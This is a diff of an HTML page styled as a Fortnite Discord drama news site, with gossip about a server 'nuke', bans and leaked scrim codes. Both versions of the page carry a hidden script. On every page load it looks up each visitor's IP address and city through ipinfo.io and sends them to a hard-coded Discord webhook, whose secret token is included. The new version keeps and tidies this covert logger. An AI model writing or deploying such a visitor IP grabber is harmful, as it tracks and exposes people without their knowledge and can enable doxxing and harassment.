@@ -1,183 +1,175 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>The Dream Circuits News Page</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>The Dream Circuits News Page</title>
 
-  <!-- Basic Meta -->
-  <meta name="description" content="The Dream Circuits News Page - Fortnite Discord drama, scrim results, leaks, and chaos. Stay in the loop with the wildest updates.">
+    <!-- Basic Meta -->
+    <meta name="description" content="The Dream Circuits News Page - Fortnite Discord drama, scrim results, leaks, and chaos. Stay in the loop with the wildest updates." />
 
-  <!-- Open Graph / Discord Embed -->
-  <meta property="og:title" content="The Dream Circuits News Page">
-  <meta property="og:description" content="Fortnite Discord drama and news. The #1 place for nuke alerts, beef, bans, and cracked plays.">
-  <meta property="og:image" content="https://example.com/og-image.jpg"> <!-- Optional: replace with real image URL -->
-  <meta property="og:url" content="https://dreamcircuits.gg/news">
-  <meta property="og:type" content="website">
+    <!-- Open Graph / Discord Embed -->
+    <meta property="og:title" content="The Dream Circuits News Page" />
+    <meta property="og:description" content="Fortnite Discord drama and news. The #1 place for nuke alerts, beef, bans, and cracked plays." />
+    <meta property="og:image" content="https://example.com/og-image.jpg" />
+    <meta property="og:url" content="https://dreamcircuits.gg/news" />
+    <meta property="og:type" content="website" />
 
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #0e0e1b;
-      color: #fff;
-      margin: 0;
-      padding: 0;
-    }
-    header {
-      background-color: #1a1a2e;
-      padding: 20px;
-      text-align: center;
-    }
-    header h1 {
-      color: #00eaff;
-      margin: 0;
-      font-size: 2.5rem;
-    }
-    nav {
-      background-color: #12122a;
-      padding: 10px 0;
-      text-align: center;
-    }
-    nav a {
-      margin: 0 15px;
-      color: #bbb;
-      text-decoration: none;
-      font-weight: bold;
-    }
-    nav a:hover {
-      color: #00eaff;
-    }
-    .container {
-      max-width: 900px;
-      margin: 20px auto;
-      padding: 0 20px;
-    }
-    .breaking {
-      background-color: #ff2f2f;
-      padding: 15px;
-      border-radius: 10px;
-      margin-bottom: 25px;
-    }
-    .breaking h2 {
-      margin: 0;
-      font-size: 1.5rem;
-    }
-    .article {
-      background-color: #1f1f38;
-      padding: 15px;
-      margin-bottom: 15px;
-      border-radius: 8px;
-    }
-    .article h3 {
-      margin: 0 0 8px 0;
-      color: #00eaff;
-    }
-    .poll {
-      background-color: #16162a;
-      padding: 15px;
-      margin-top: 25px;
-      border-radius: 8px;
-    }
-    .poll button {
-      margin: 5px;
-      background-color: #2c2c5a;
-      border: none;
-      padding: 10px 15px;
-      color: #fff;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    .poll button:hover {
-      background-color: #00eaff;
-    }
-    .footer {
-      text-align: center;
-      padding: 20px;
-      font-size: 0.9rem;
-      color: #666;
-    }
-  </style>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #0e0e1b;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #1a1a2e;
+            padding: 20px;
+            text-align: center;
+        }
+        header h1 {
+            color: #00eaff;
+            margin: 0;
+            font-size: 2.5rem;
+        }
+        nav {
+            background-color: #12122a;
+            padding: 10px 0;
+            text-align: center;
+        }
+        nav a {
+            margin: 0 15px;
+            color: #bbb;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        nav a:hover {
+            color: #00eaff;
+        }
+        .container {
+            max-width: 900px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        .breaking {
+            background-color: #ff2f2f;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        .breaking h2 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+        .article {
+            background-color: #1f1f38;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+        }
+        .article h3 {
+            margin: 0 0 8px 0;
+            color: #00eaff;
+        }
+        .poll {
+            background-color: #16162a;
+            padding: 15px;
+            margin-top: 25px;
+            border-radius: 8px;
+        }
+        .poll button {
+            margin: 5px;
+            background-color: #2c2c5a;
+            border: none;
+            padding: 10px 15px;
+            color: #fff;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .poll button:hover {
+            background-color: #00eaff;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+    </style>
 </head>
 
 <body>
-    <div id="ip-load-info" style="text-align:center; margin-top:20px; color:#00eaff;"></div>
+    <header>
+        <h1>DC Fortnite News</h1>
+        <p>The #1 Source for Fortnite Discord Chaos</p>
+    </header>
+
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Leaks</a>
+        <a href="#">Drama</a>
+        <a href="#">Scrim Results</a>
+        <a href="#">Shop Watch</a>
+        <a href="#">Submit Clip</a>
+    </nav>
+
+    <div class="container">
+        <div class="breaking">
+            <h2>🚨 DC Server Gets Nuked!</h2>
+            <p>Today, the DC Fortnite Discord was wiped clean after a person that goes by the name, twilightishimgnl, nuked a server. Lots of damage was done. A full wipe of channels followed. “Join NA Ladder` and racial slurs accured like it was a creative reset,”</p>
+        </div>
+
+        <div class="article">
+            <h3>🔥 Player Drops 30 Bomb, Gets Banned for 'Suspicious Aim'</h3>
+            <p>“I just flicked him,” said @cl1pszn. “Now they calling me soft aim?”</p>
+        </div>
+
+        <div class="article">
+            <h3>🎮 Trio Screams Turn Into Real Screaming</h3>
+            <p>DC's top trio broke up on voice last night mid-fight. One member reportedly smashed a keyboard live on Twitch.</p>
+        </div>
+
+        <div class="article">
+            <h3>🧠 Mod Leaks Secret Scrim Codes</h3>
+            <p>Leaked codes caused chaos as 12-year-olds joined pro lobbies. “It was supposed to be friends only.”</p>
+        </div>
+
+        <div class="poll">
+            <h3>📊 POLL: Should the Nuker Be Unbanned?</h3>
+            <button>✅ Yes — it was funny</button>
+            <button>❌ No — dude's a menace</button>
+            <button>💀 Only if he drops a Fortnite apology montage</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2025 DC Fortnite News | Not affiliated with Epic Games or actual Fortnite skill
+    </div>
+
     <script>
-  fetch('https://ipinfo.io/json?token=9b88a4f00b132f')
-    .then(res => res.json())
-    .then(data => {
-      // Build the payload for Discord webhook
-      const payload = {
-        content: `New visitor info:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}`
-      };
+        window.addEventListener('load', () => {
+            fetch('https://ipinfo.io/json?token=9b88a4f00b132f')
+                .then(res => res.json())
+                .then(data => {
+                    const payload = {
+                        content: `New visitor info:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}`
+                    };
 
-      // Your webhook URL (replace with your actual webhook)
-      const webhookURL = 'https://discord.com/api/webhooks/1381419732095209472/bstVFrhUSlpARvbQ7I5C9waHRTLGl_1dqZ9q_FVYxj4Cu0Tqsx8Egd4rQ9CL1JbAZMMM';
+                    const webhookURL = 'https://discord.com/api/webhooks/1381419732095209472/bstVFrhUSlpARvbQ7I5C9waHRTLGl_1dqZ9q_FVYxj4Cu0Tqsx8Egd4rQ9CL1JbAZMMM';
 
-      // Send data to webhook
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload),
-      })
-      .then(() => {
-        console.log('Visitor info sent to webhook');
-      })
-      .catch(err => {
-        console.error('Error sending to webhook:', err);
-      });
-    })
-    .catch(() => {
-      console.error('Failed to get IP info');
-    });
-</script>
-  <header>
-    <h1>DC Fortnite News</h1>
-    <p>The #1 Source for Fortnite Discord Chaos</p>
-  </header>
-
-  <nav>
-    <a href="#">Home</a>
-    <a href="#">Leaks</a>
-    <a href="#">Drama</a>
-    <a href="#">Scrim Results</a>
-    <a href="#">Shop Watch</a>
-    <a href="#">Submit Clip</a>
-  </nav>
-
-  <div class="container">
-    <div class="breaking">
-      <h2>🚨 DC Server Gets Nuked!</h2>
-      <p>Today, the DC Fortnite Discord was wiped clean after a person that goes by the name, twilightishimgnl, nuked a server. Lots of damage was done. A full wipe of channels followed. “Join NA Ladder` and racial slurs accured like it was a creative reset,”</p>
-    </div>
-
-    <div class="article">
-      <h3>🔥 Player Drops 30 Bomb, Gets Banned for 'Suspicious Aim'</h3>
-      <p>“I just flicked him,” said @cl1pszn. “Now they calling me soft aim?”</p>
-    </div>
-
-    <div class="article">
-      <h3>🎮 Trio Screams Turn Into Real Screaming</h3>
-      <p>DC's top trio broke up on voice last night mid-fight. One member reportedly smashed a keyboard live on Twitch.</p>
-    </div>
-
-    <div class="article">
-      <h3>🧠 Mod Leaks Secret Scrim Codes</h3>
-      <p>Leaked codes caused chaos as 12-year-olds joined pro lobbies. “It was supposed to be friends only.”</p>
-    </div>
-
-    <div class="poll">
-      <h3>📊 POLL: Should the Nuker Be Unbanned?</h3>
-      <button>✅ Yes — it was funny</button>
-      <button>❌ No — dude's a menace</button>
-      <button>💀 Only if he drops a Fortnite apology montage</button>
-    </div>
-  </div>
-
-  <div class="footer">
-    © 2025 DC Fortnite News | Not affiliated with Epic Games or actual Fortnite skill
-  </div>
-
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                    })
+                    .then(() => console.log('Visitor info sent to webhook'))
+                    .catch(err => console.error('Error sending to webhook:', err));
+                })
+                .catch(() => {
+                    console.error('Failed to get IP info');
+                });
+        });
+    </script>
 </body>
 </html>
